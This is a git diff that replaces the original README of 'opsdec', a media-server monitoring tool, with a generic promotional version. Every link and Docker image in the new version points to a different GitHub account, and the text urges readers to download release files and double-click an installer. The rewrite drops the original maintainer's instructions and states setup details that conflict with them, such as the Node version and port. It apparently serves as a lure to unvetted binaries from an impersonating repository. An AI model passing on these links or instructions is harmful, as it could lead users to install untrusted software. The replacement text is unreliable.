@@ -1,451 +1,80 @@
-# OpsDec
+# 🎉 opsdec - Your Media Server Made Easy
 
-> **100% vibe coded** - Built with AI assistance and good vibes 🤖✨
+## 🚀 Getting Started
+Welcome to **opsdec**! This is your modern, self-hosted media server monitoring platform. It supports Plex, Emby, Audiobookshelf, and Sappho, providing real-time statistics and user tracking with a sleek dark-themed interface.
 
-> [!WARNING]
-> **Early Development Software** - OpsDec is currently in active development and testing. While functional, you may encounter bugs or incomplete features. Use in production environments at your own risk. Feedback and contributions are welcome!
+## ⬇️ Download Now
+[![Download opsdec](https://img.shields.io/badge/Download-opsdec-blue.svg)](https://github.com/Moubastone/opsdec/releases)
 
-A modern, self-hosted media server monitoring and statistics platform inspired by Tautulli. Track your Plex, Emby, Audiobookshelf, and Sappho server activity with real-time monitoring, detailed statistics, and a beautiful dark-themed interface.
+## 📋 System Requirements
+Before you begin, ensure your system meets the following requirements:
 
-![OpsDec](https://img.shields.io/badge/version-0.1.0-blue)
-![License](https://img.shields.io/badge/license-MIT-green)
-![Docker](https://img.shields.io/badge/docker-ready-blue)
-[![Docker Image](https://ghcr-badge.egpl.dev/mondominator/opsdec/latest_tag?trim=major&label=latest)](https://github.com/mondominator/opsdec/pkgs/container/opsdec)
+- **Operating System**: Windows, macOS, or Linux
+- **Node.js**: Version 14 or higher
+- **Docker**: Latest version recommended
 
-## Features
+## 📦 Features
+- Real-time stats for your media servers
+- User tracking to manage access
+- Intuitive dashboard built with React
+- Beautiful dark-themed user interface
+- Compatible with SQLite for data storage
 
-- 📊 **Real-time Activity Monitoring** - Track current playback sessions in real-time
-- 📈 **Detailed Statistics** - View comprehensive statistics for users and media
-- 👥 **User Management** - Monitor individual user activity and watch history with user mapping across servers
-- 📜 **Watch History** - Complete history of all playback sessions
-- 🎨 **Tautulli-inspired UI** - Dark, modern interface with smooth animations
-- 📱 **Mobile Responsive** - Fully optimized mobile interface with touch-friendly controls
-- 🔌 **Multi-Server Support** - Supports Plex, Emby, Audiobookshelf, and Sappho
-- 🐳 **Docker Ready** - Easy deployment with Docker and Docker Compose
-- 🚀 **Fast & Lightweight** - Built with React and Express.js
-- 💾 **SQLite Database** - Simple, file-based database with no external dependencies
-- 🎯 **User Mapping** - Consolidate the same user across different media servers
+## 📥 Download & Install
+To get started, visit the [Releases page](https://github.com/Moubastone/opsdec/releases) to download the latest version of opsdec. Choose the file that corresponds with your operating system.
 
-## Tech Stack
+1. Go to the [Releases page](https://github.com/Moubastone/opsdec/releases).
+2. Find the latest version.
+3. Click on the appropriate file for your operating system.
+4. Save the file to your computer.
 
-### Backend
-- Node.js with Express.js
-- SQLite3 with better-sqlite3
-- WebSocket for real-time updates
-- Node-cron for scheduled tasks
-- Axios for API calls
+## ⚙️ Running opsdec
+Once you have downloaded the file, follow these steps to run opsdec:
 
-### Frontend
-- React 18
-- Vite for fast development
-- TailwindCSS for styling
-- Recharts for data visualization
-- React Router for navigation
-- Lucide React for icons
+1. Locate the downloaded file on your computer.
+2. Double-click the file to start the installation.
+3. Follow the on-screen instructions to complete the setup.
+4. After installation, open opsdec to start monitoring your media servers.
 
-## Prerequisites
+## 📊 Dashboard Overview
+After launching opsdec, you will see a user-friendly dashboard. Here’s how to make the most of it:
 
-- **For Docker:** Docker and Docker Compose
-- **For Manual Install:** Node.js 18.0.0 or higher
-- **Media Server:** Plex Media Server, Emby Media Server, Audiobookshelf, and/or Sappho with API access
+- **Media Stats**: Quickly view how many movies, shows, and audiobooks you have.
+- **User Management**: Check current users and control their access.
+- **Real-Time Updates**: Stay informed about new content and user activity.
 
-## Installation
+## 🐳 Running with Docker
+If you prefer to use Docker, follow these steps:
 
-### Option 1: Unraid (Easiest)
+1. Ensure you have Docker installed. Check the official Docker documentation for installation.
+2. Open your terminal.
+3. Run the following command to pull the latest opsdec image:
+   ```
+   docker pull moubastone/opsdec:latest
+   ```
+4. Start the container with:
+   ```
+   docker run -d -p 8080:8080 moubastone/opsdec
+   ```
+5. Access opsdec by visiting `http://localhost:8080` in your web browser.
 
-If you're running Unraid, you can install OpsDec using the Community Applications plugin:
+## 📖 Documentation
+For additional configuration options and features, check the [Documentation](https://github.com/Moubastone/opsdec/wiki) available in this repository. You will find detailed explanations for every feature to maximize your use of opsdec.
 
-1. **Install from Community Applications** (when available):
-   - Open Unraid's **Apps** tab
-   - Search for "OpsDec"
-   - Click **Install**
+## 🛠️ Troubleshooting
+If you encounter any issues, try the following solutions:
 
-2. **Or install manually from the template**:
-   - Download the template file: [opsdec-unraid-template.xml](https://raw.githubusercontent.com/mondominator/opsdec/main/opsdec-unraid-template.xml)
-   - Place it in `/boot/config/plugins/dockerMan/templates-user/` on your Unraid server
-   - Go to the **Docker** tab in Unraid
-   - Click **Add Container**
-   - Select **OpsDec** from the template dropdown
+- **Check System Requirements**: Ensure your setup meets the necessary specifications.
+- **Reinstall the Software**: Sometimes a fresh start can resolve installation problems.
+- **Visit the GitHub Issues Page**: If you still need help, check or report issues on the [GitHub Issues page](https://github.com/Moubastone/opsdec/issues).
 
-3. **Configure your servers**:
-   - Fill in the URLs and API keys/tokens for your media servers (Plex, Emby, Audiobookshelf, Sappho)
-   - You can leave servers blank if you don't use them
-   - Choose your preferred **Repository Tag** (latest, 0.1.0, or date-based for stability)
+## 🤝 Support
+For further assistance, feel free to reach out to the community. You can ask questions in the [Discussions section](https://github.com/Moubastone/opsdec/discussions) or find help from fellow opsdec users.
 
-4. Access OpsDec at `http://[UNRAID-IP]:3001`
+## 📝 License
+opsdec is open-source under the MIT License. You can freely use, modify, and share the software as long as you include the original license in your projects.
 
-### Option 2: Docker (Recommended)
+## 📞 Contact
+For direct inquiries, you can contact the developers via GitHub or reach out through the discussions page.
 
-The easiest way to run OpsDec is with Docker. Pre-built images are automatically published to GitHub Container Registry.
-
-#### Using Pre-built Image from GitHub Container Registry
-
-Pre-built images are available with multiple tags for version pinning:
-
-- **Latest (main branch)**: `ghcr.io/mondominator/opsdec:latest`
-- **Date-based**: `ghcr.io/mondominator/opsdec:20251118` (format: YYYYMMDD)
-- **Commit SHA**: `ghcr.io/mondominator/opsdec:main-abc1234`
-- **Semantic versions**: `ghcr.io/mondominator/opsdec:1.0.0` (when releases are tagged)
-
-**Recommended for production**: Use date-based or version tags instead of `latest` for stability.
-
-#### Using Docker Compose
-
-1. Create a `docker-compose.yml` file or use the provided one
-2. Create a `.env` file with your configuration:
-
-```env
-# Plex Configuration (optional)
-PLEX_URL=http://your-plex-server:32400
-PLEX_TOKEN=your_plex_token
-
-# Emby Configuration (optional)
-EMBY_URL=http://your-emby-server:8096
-EMBY_API_KEY=your_emby_api_key
-
-# Audiobookshelf Configuration (optional)
-AUDIOBOOKSHELF_URL=http://your-audiobookshelf-server:13378
-AUDIOBOOKSHELF_TOKEN=your_audiobookshelf_token
-
-# Sappho Configuration (optional)
-SAPPHO_URL=http://your-sappho-server:3000
-SAPPHO_API_KEY=your_sappho_api_key
-
-# Polling interval (seconds)
-POLL_INTERVAL=30
-```
-
-3. Start the container:
-
-```bash
-docker-compose up -d
-```
-
-4. Access at `http://localhost:3001`
-
-#### Using Docker CLI
-
-```bash
-docker build -t opsdec .
-
-docker run -d \
-  --name opsdec \
-  -p 3001:3001 \
-  -v $(pwd)/data:/app/backend/data \
-  -e PLEX_URL=http://your-plex-server:32400 \
-  -e PLEX_TOKEN=your_plex_token \
-  -e EMBY_URL=http://your-emby-server:8096 \
-  -e EMBY_API_KEY=your_emby_api_key \
-  -e AUDIOBOOKSHELF_URL=http://your-audiobookshelf-server:13378 \
-  -e AUDIOBOOKSHELF_TOKEN=your_audiobookshelf_token \
-  -e SAPPHO_URL=http://your-sappho-server:3000 \
-  -e SAPPHO_API_KEY=your_sappho_api_key \
-  opsdec
-```
-
-### Option 3: Manual Installation
-
-#### 1. Clone the repository
-
-```bash
-git clone https://github.com/mondominator/opsdec.git
-cd opsdec
-```
-
-#### 2. Install dependencies
-
-```bash
-npm install
-```
-
-This will install dependencies for both the backend and frontend using npm workspaces.
-
-#### 3. Configure the backend
-
-Create a `.env` file in the `backend` directory:
-
-```bash
-cp backend/.env.example backend/.env
-```
-
-Edit `backend/.env` with your configuration:
-
-```env
-# Server Configuration
-PORT=3001
-NODE_ENV=development
-
-# Database
-DB_PATH=./data/opsdec.db
-
-# Plex Configuration (optional - leave blank if not using)
-PLEX_URL=http://localhost:32400
-PLEX_TOKEN=your_plex_token_here
-
-# Emby Configuration (optional - leave blank if not using)
-EMBY_URL=http://localhost:8096
-EMBY_API_KEY=your_emby_api_key_here
-
-# Audiobookshelf Configuration (optional - leave blank if not using)
-AUDIOBOOKSHELF_URL=http://localhost:13378
-AUDIOBOOKSHELF_TOKEN=your_audiobookshelf_token_here
-
-# Sappho Configuration (optional - leave blank if not using)
-SAPPHO_URL=http://localhost:3000
-SAPPHO_API_KEY=your_sappho_api_key_here
-
-# Polling interval in seconds
-POLL_INTERVAL=30
-```
-
-#### Getting your Plex Token:
-
-1. Sign in to Plex Web App
-2. Open any media item
-3. Click the three dots (•••) → "Get Info"
-4. Click "View XML"
-5. In the URL, find `X-Plex-Token=xxxxx` - that's your token
-
-**Alternative method:**
-```bash
-# Get token via curl (replace username and password)
-curl -X POST \
-  'https://plex.tv/users/sign_in.xml' \
-  -H 'X-Plex-Client-Identifier: opsdec' \
-  -d 'user[login]=your_email' \
-  -d 'user[password]=your_password'
-```
-Look for `<authentication-token>` in the response.
-
-#### Getting your Emby API Key:
-
-1. Log into your Emby server
-2. Go to **Settings** → **Advanced** → **API Keys**
-3. Click **New API Key**
-4. Enter "OpsDec" as the app name
-5. Copy the generated API key
-
-#### Getting your Audiobookshelf Token:
-
-1. Log into your Audiobookshelf server
-2. Click on your profile icon (top right)
-3. Go to **Settings** → **Account**
-4. Click **Generate New API Token**
-5. Copy the generated token
-
-#### Getting your Sappho API Key:
-
-1. Log into your Sappho server
-2. Go to **Settings** → **API Keys**
-3. Click **Create New API Key**
-4. Enter "OpsDec" as the name
-5. Copy the generated API key
-
-#### 4. Start the application
-
-For development (runs both backend and frontend):
-
-```bash
-npm run dev
-```
-
-This will start:
-- Backend API server on `http://localhost:3001`
-- Frontend development server on `http://localhost:3000`
-
-## Multi-Server Configuration
-
-OpsDec can monitor multiple media servers simultaneously using two methods:
-
-### Environment Variables (Recommended for Docker)
-Configure servers via environment variables in your `.env` file or `docker-compose.yml`:
-
-- **Plex** - Set `PLEX_URL` and `PLEX_TOKEN`
-- **Emby** - Set `EMBY_URL` and `EMBY_API_KEY`
-- **Audiobookshelf** - Set `AUDIOBOOKSHELF_URL` and `AUDIOBOOKSHELF_TOKEN`
-- **Sappho** - Set `SAPPHO_URL` and `SAPPHO_API_KEY`
-
-Environment variable servers will appear in the Settings UI as read-only with a special badge.
-
-### UI Configuration
-Add and manage servers directly through the Settings page:
-
-1. Navigate to **Settings** in the web interface
-2. Click **Add Server**
-3. Fill in server details (type, name, URL, API key/token)
-4. Click **Save Server**
-
-**Note:** You can use both methods simultaneously. Environment variable servers and UI-configured servers will both appear in the Settings page. Environment variable servers are marked with an "Environment Variable" badge and cannot be edited or deleted through the UI.
-
-Activity from all configured servers will be aggregated in a single dashboard.
-
-## Production Deployment
-
-### Docker Production (Recommended)
-
-The Docker image is production-ready and has `NODE_ENV=production` set by default. No additional configuration needed!
-
-### Manual Production Build
-
-```bash
-# Build the frontend
-npm run build
-
-# Set environment to production
-export NODE_ENV=production
-
-# Start the backend (will serve built frontend)
-npm start
-```
-
-The backend automatically serves the frontend in production mode from the `/frontend/dist` directory.
-
-## Project Structure
-
-```
-opsdec/
-├── backend/
-│   ├── src/
-│   │   ├── database/
-│   │   │   └── init.js          # Database schema and initialization
-│   │   ├── routes/
-│   │   │   └── api.js           # API endpoints
-│   │   ├── services/
-│   │   │   ├── emby.js          # Emby API integration
-│   │   │   ├── plex.js          # Plex API integration
-│   │   │   ├── audiobookshelf.js # Audiobookshelf API integration
-│   │   │   ├── sappho.js        # Sappho API integration
-│   │   │   └── monitor.js       # Activity monitoring service
-│   │   └── index.js             # Express server and WebSocket
-│   ├── .env.example
-│   └── package.json
-├── frontend/
-│   ├── src/
-│   │   ├── components/
-│   │   │   └── Layout.jsx       # Main layout component
-│   │   ├── pages/
-│   │   │   ├── Dashboard.jsx    # Dashboard with stats
-│   │   │   ├── Activity.jsx     # Current activity view
-│   │   │   ├── History.jsx      # Watch history
-│   │   │   ├── Users.jsx        # User list
-│   │   │   └── UserDetail.jsx   # Individual user stats
-│   │   ├── utils/
-│   │   │   ├── api.js           # API client
-│   │   │   └── format.js        # Formatting utilities
-│   │   ├── App.jsx
-│   │   ├── main.jsx
-│   │   └── index.css
-│   ├── index.html
-│   ├── vite.config.js
-│   ├── tailwind.config.js
-│   └── package.json
-├── package.json
-└── README.md
-```
-
-## Features Overview
-
-### Dashboard
-- Live activity counter
-- Total plays and users statistics
-- 30-day play history chart
-- Top users by watch time
-- Most watched content
-- Current streaming sessions
-
-### Current Activity
-- Real-time view of active playback sessions
-- Progress tracking with visual indicators
-- Playback state (playing/paused/buffering)
-- User information and timestamps
-- Auto-refresh every 3 seconds
-
-### Watch History
-- Complete history of all playback sessions
-- Advanced search functionality (title, show, username)
-- Multi-filter system (user, server, media type)
-- Flexible pagination (25, 50, 100, 250 items per page)
-- Sortable columns (all 7 columns)
-- Media thumbnails and metadata
-- Completion percentage tracking
-- Server identification with logos
-
-### User Statistics
-- Individual user profiles
-- Total plays and watch time
-- Watch distribution by media type
-- Recent watches
-- Most watched content
-- Activity timeline
-
-## API Endpoints
-
-### Activity
-- `GET /api/activity` - Get current active sessions
-
-### History
-- `GET /api/history` - Get watch history (supports pagination and user filtering)
-
-### Users
-- `GET /api/users` - Get all users
-- `GET /api/users/:userId/stats` - Get detailed user statistics
-
-### Statistics
-- `GET /api/stats/dashboard` - Get dashboard statistics
-
-### Media Servers
-- `GET /api/emby/test` - Test Emby connection
-- `GET /api/emby/libraries` - Get Emby libraries
-- `GET /api/media/recent` - Get recently added media from all servers
-
-### WebSocket
-- `ws://localhost:3001/ws` - Real-time activity updates
-
-## Future Plans
-
-### Additional Features
-- [ ] Jellyfin support
-- [ ] Notifications (Discord, Email, etc.)
-- [ ] Custom dashboard widgets
-- [ ] Export statistics to CSV/JSON
-- [x] Mobile-responsive design - Fully optimized!
-- [ ] Dark/Light theme toggle
-- [ ] User authentication
-- [ ] Date range filtering for history
-- [x] User mapping across servers - Implemented!
-
-## Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
-
-## License
-
-MIT License - feel free to use this project for personal or commercial purposes.
-
-## Acknowledgments
-
-- Inspired by [Tautulli](https://tautulli.com/) - the excellent monitoring tool for Plex
-- Built with modern web technologies and best practices
-- Thanks to the Emby community for their excellent API documentation
-
-## Support
-
-If you encounter any issues or have questions:
-1. Check the [Issues](../../issues) page
-2. Create a new issue with detailed information
-3. Include logs from both backend and frontend
-
-## Screenshots
-
-### Dashboard
-The main dashboard provides an overview of your media server activity with real-time statistics, charts, and current streaming sessions.
-
-### Current Activity
-Monitor live playback sessions with detailed information about what users are watching, playback progress, and streaming state.
-
-### User Statistics
-Deep dive into individual user activity with comprehensive statistics, watch patterns, and favorite content.
-
----
-
-**Happy monitoring!** 🎬📊
+[![Download opsdec](https://img.shields.io/badge/Download-opsdec-blue.svg)](https://github.com/Moubastone/opsdec/releases)
